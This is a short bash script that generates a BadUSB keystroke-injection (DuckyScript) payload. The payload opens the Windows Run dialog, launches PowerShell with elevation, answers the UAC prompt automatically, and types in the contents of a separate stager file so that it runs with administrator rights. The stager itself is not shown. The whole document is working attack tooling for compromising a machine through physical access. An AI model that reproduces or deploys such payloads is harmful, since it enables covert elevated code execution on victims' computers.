#!/bin/bash

cat <<-EOF >script.txt
DELAY 500
GUI r
DELAY 500
STRING powershell.exe Start-Process powershell.exe -Verb RunAs
ENTER
DELAY 5000
ALT y
DELAY 1500
CTRL BACKSPACE
$(cat stager.txt | fold -w99 | sed 's/^/STRING /g')
ENTER

EOF
